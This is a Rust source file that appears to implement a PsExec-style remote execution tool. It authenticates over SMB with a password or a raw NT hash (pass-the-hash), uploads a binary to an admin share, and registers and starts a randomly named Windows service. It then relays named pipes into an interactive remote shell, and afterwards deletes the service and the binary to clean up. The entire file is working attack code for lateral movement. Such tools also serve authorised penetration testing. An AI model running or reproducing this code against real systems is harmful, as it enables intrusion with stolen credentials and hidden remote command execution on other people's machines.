use std::io::{Read, Write};
use std::mem;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use rand::Rng;

use crate::error::{Error, Result};
use crate::ntlm::{NtlmContext, parse_hash_string};
use crate::smb2::Smb2Client;
use crate::svcctl::{SvcCtl, SERVICE_CONTROL_STOP};
use crate::service::{
    comm_pipe_name, STDIN_PREFIX, STDOUT_PREFIX, STDERR_PREFIX,
    RemComMessage, RemComResponse,
};


pub struct RunOptions {
    pub target:              String,
    pub port:                u16,
    pub username:            Option<String>,
    pub password:            Option<String>,
    pub hashes:              Option<String>,
    pub domain:              String,
    pub command:             String,
    pub share:               String,
    pub custom_binary:       Option<String>,
    pub service_name:        Option<String>,
    pub remote_binary_name:  Option<String>,
    pub path_override:       Option<String>,
    pub debug:               bool,
    pub ts:                  bool,
}


fn log(msg: &str, ts: bool) {
    if ts {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        println!("[{:010}] {}", now, msg);
    } else {
        println!("{}", msg);
    }
}


pub fn run(opts: RunOptions) -> Result<()> {
    let ts = opts.ts;

    let mut rng = rand::thread_rng();

    let svc_name = opts.service_name.clone()
        .unwrap_or_else(|| format!("RSvc{:08X}", rng.gen::<u32>()));

    let bin_name = opts.remote_binary_name.clone()
        .unwrap_or_else(|| format!("{}.exe", svc_name));

    let remote_base = opts.path_override.clone()
        .unwrap_or_else(|| "%SystemRoot%".to_string());

    // SCM expands %SystemRoot% before launching
    // Pass the binary name without path and rely on the share to %SystemRoot% mapping.
    let svc_image_path = format!(
        "{}\\{} --service --svc-name {}",
        remote_base, bin_name, svc_name
    );

    let username = opts.username.as_deref().unwrap_or("");
    let domain   = opts.domain.as_str();

    let ntlm: NtlmContext = if let Some(ref hash_str) = opts.hashes {
        let nt_hash = parse_hash_string(hash_str)?;
        if opts.debug {
            eprintln!("[DEBUG] PTH mode, NT hash = {}", hex_str(&nt_hash));
        }
        NtlmContext::from_nt_hash(username, domain, nt_hash)
    } else {
        let pw = opts.password.as_deref().unwrap_or("");
        NtlmContext::from_password(username, domain, pw)
    };

    if opts.debug {
        eprintln!("[DEBUG] target   = {}:{}", opts.target, opts.port);
        eprintln!("[DEBUG] domain   = {}", domain);
        eprintln!("[DEBUG] username = {}", username);
        eprintln!("[DEBUG] command  = {}", opts.command);
        eprintln!("[DEBUG] share    = {}", opts.share);
        eprintln!("[DEBUG] svc     = {}", svc_name);
        eprintln!("[DEBUG] bin     = {}", bin_name);
    }

    let binary_data: Vec<u8> = if let Some(ref p) = opts.custom_binary {
        std::fs::read(p)
            .map_err(|e| Error::Msg(format!("read '{}': {}", p, e)))?
    } else {
        let exe = std::env::current_exe()
            .map_err(|e| Error::Msg(format!("current_exe: {}", e)))?;
        std::fs::read(&exe)
            .map_err(|e| Error::Msg(format!("read self '{}': {}", exe.display(), e)))?
    };

    log(&format!("[*] Authenticating to {}:{} ...", opts.target, opts.port), ts);
    log(&format!("[*] Uploading {} bytes → {}\\{} ...", binary_data.len(), opts.share, bin_name), ts);
    {
        let mut smb = Smb2Client::connect(&opts.target, opts.port, &ntlm)?;
        let tree_id = smb.tree_connect(&opts.share)?;
        let fid     = smb.create_file(tree_id, &bin_name)?;
        smb.write_file(tree_id, fid, &binary_data)?;
        smb.close(tree_id, fid)?;
    }

    log(&format!("[*] Opening remote SCM on {} ...", opts.target), ts);
    let mut svcctl = SvcCtl::connect(&opts.target, opts.port, &ntlm)?;
    let scm = svcctl.open_scm(&opts.target)?;

    log(&format!("[*] Creating service '{}' ...", svc_name), ts);
    let svc = svcctl.create_service(scm, &svc_name, &svc_name, &svc_image_path)?;

    log("[*] Starting service ...", ts);
    if let Err(e) = svcctl.start_service(svc) {
        let _ = svcctl.delete_service(svc);
        let _ = svcctl.close_handle(svc);
        let _ = svcctl.close_handle(scm);
        delete_remote_binary(&opts.target, opts.port, &ntlm, &opts.share, &bin_name);
        return Err(e);
    }

    let result = io_session(&opts, &ntlm, &svc_name, ts);

    log("[*] Stopping service ...", ts);
    let _ = svcctl.control_service(svc, SERVICE_CONTROL_STOP);
    thread::sleep(Duration::from_millis(2_000));
    log("[*] Deleting service ...", ts);
    let _ = svcctl.delete_service(svc);
    let _ = svcctl.close_handle(svc);
    let _ = svcctl.close_handle(scm);

    log("[*] Deleting remote binary ...", ts);
    delete_remote_binary(&opts.target, opts.port, &ntlm, &opts.share, &bin_name);

    result
}


fn io_session(opts: &RunOptions, ntlm: &NtlmContext, _svc_name: &str, ts: bool) -> Result<()> {
    let local_machine = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "ATTACKER".into());
    let local_pid     = std::process::id();

    //  Open comm pipe (with retry — service may not have started yet) 
    log("[*] Waiting for communication pipe ...", ts);
    let mut smb_comm = Smb2Client::connect_relay(&opts.target, opts.port, ntlm)?;
    let comm_tree = smb_comm.tree_connect("IPC$")?;
    let comm_fid  = smb_comm.wait_pipe(comm_tree, &comm_pipe_name(_svc_name), 20_000,
                                       crate::smb2::FILE_GENERIC_READ | crate::smb2::FILE_GENERIC_WRITE)?;

    //  Send RemComMessage 
    let msg = RemComMessage::new(&opts.command, "C:\\Windows\\System32", &local_machine, local_pid);
    let msg_bytes = unsafe {
        std::slice::from_raw_parts(
            &msg as *const RemComMessage as *const u8,
            mem::size_of::<RemComMessage>(),
        )
    };

    if opts.debug {
        eprintln!("[DEBUG] RemComMessage: cmd='{}' machine='{}' pid={}", opts.command, local_machine, local_pid);
        eprintln!("[DEBUG] I/O pipe suffix = '{}{}'", local_machine, local_pid);
    }

    log(&format!("[*] Sending command: \"{}\"", opts.command), ts);
    smb_comm.write_pipe(comm_tree, comm_fid, msg_bytes)?;

    let stdout_pipe = format!("{}{}{}", STDOUT_PREFIX, local_machine, local_pid);
    let stderr_pipe = format!("{}{}{}", STDERR_PREFIX, local_machine, local_pid);
    let stdin_pipe  = format!("{}{}{}", STDIN_PREFIX,  local_machine, local_pid);

    log("[*] Connecting I/O pipes ...", ts);

    let done = Arc::new(AtomicBool::new(false));

    let t_out = {
        let done2     = done.clone();
        let host      = opts.target.clone();
        let port      = opts.port;
        let ntlm2     = ntlm.clone();
        let pipe      = stdout_pipe;
        thread::spawn(move || relay_read(host, port, ntlm2, pipe, std::io::stdout(), done2))
    };

    // remote stderr to local stderr
    let t_err = {
        let done2     = done.clone();
        let host      = opts.target.clone();
        let port      = opts.port;
        let ntlm2     = ntlm.clone();
        let pipe      = stderr_pipe;
        thread::spawn(move || relay_read(host, port, ntlm2, pipe, std::io::stderr(), done2))
    };

    log("[+] Shell ready — Ctrl-C or type 'exit' to quit.", ts);
    println!();

    // local stdin to remote stdin pipe
    let _t_in = {
        let done2  = done.clone();
        let host   = opts.target.clone();
        let port   = opts.port;
        let ntlm2  = ntlm.clone();
        let pipe   = stdin_pipe;
        thread::spawn(move || relay_write(host, port, ntlm2, pipe, done2))
    };

    let _ = t_out.join();
    let _ = t_err.join();


    let resp_size = mem::size_of::<RemComResponse>() as u32;
    match smb_comm.read_pipe(comm_tree, comm_fid, resp_size) {
        Ok(data) if data.len() >= 8 => {
            let return_code = u32::from_le_bytes(data[4..8].try_into().unwrap());
            log(&format!("[*] Process exited with code {}.", return_code), ts);
        }
        _ => log("[*] Connection closed (no exit code received).", ts),
    }

    Ok(())
}


fn relay_read<W: Write + Send + 'static>(
    host:  String, port: u16, ntlm: NtlmContext,
    pipe:  String,
    mut sink: W,
    done:  Arc<AtomicBool>,
) {
    let mut smb = match Smb2Client::connect(&host, port, &ntlm) {
        Ok(s) => s,
        Err(_) => { done.store(true, Ordering::Relaxed); return; }
    };
    let tree_id = match smb.tree_connect("IPC$") {
        Ok(t) => t,
        Err(_) => { done.store(true, Ordering::Relaxed); return; }
    };
    let fid = match smb.wait_pipe(tree_id, &pipe, 20_000, crate::smb2::FILE_GENERIC_READ) {
        Ok(f) => f,
        Err(_) => { done.store(true, Ordering::Relaxed); return; }
    };

    loop {
        match smb.read_pipe(tree_id, fid, 4096) {
            Ok(data) if data.is_empty() => {
                if done.load(Ordering::Relaxed) { break; }
                thread::sleep(Duration::from_millis(5));
            }
            Ok(data) => {
                let _ = sink.write_all(&data);
                let _ = sink.flush();
            }
            Err(_) => break, 
        }
    }
    done.store(true, Ordering::Relaxed);
}

fn relay_write(
    host:  String, port: u16, ntlm: NtlmContext,
    pipe:  String,
    done:  Arc<AtomicBool>,
) {
    let mut smb = match Smb2Client::connect(&host, port, &ntlm) {
        Ok(s) => s,
        Err(_) => { done.store(true, Ordering::Relaxed); return; }
    };
    let tree_id = match smb.tree_connect("IPC$") {
        Ok(t) => t,
        Err(_) => { done.store(true, Ordering::Relaxed); return; }
    };
    let fid = match smb.wait_pipe(tree_id, &pipe, 20_000, crate::smb2::FILE_GENERIC_WRITE) {
        Ok(f) => f,
        Err(_) => { done.store(true, Ordering::Relaxed); return; }
    };

    let stdin = std::io::stdin();
    let mut buf = [0u8; 4096];
    loop {
        if done.load(Ordering::Relaxed) { break; }
        let n = match stdin.lock().read(&mut buf) {
            Ok(0) | Err(_) => break, // local stdin closed — exit quietly, don't signal done
            Ok(n)          => n,
        };
        if smb.write_pipe(tree_id, fid, &buf[..n]).is_err() {
            done.store(true, Ordering::Relaxed); // remote pipe failed → signal done
            break;
        }
    }
}


fn delete_remote_binary(host: &str, port: u16, ntlm: &NtlmContext, share: &str, bin_name: &str) {
    if let Ok(mut smb) = Smb2Client::connect(host, port, ntlm) {
        if let Ok(tree_id) = smb.tree_connect(share) {
            let _ = smb.delete_file(tree_id, bin_name);
        }
    }
}

fn hex_str(b: &[u8]) -> String {
    b.iter().map(|x| format!("{:02x}", x)).collect::<Vec<_>>().join("")
}
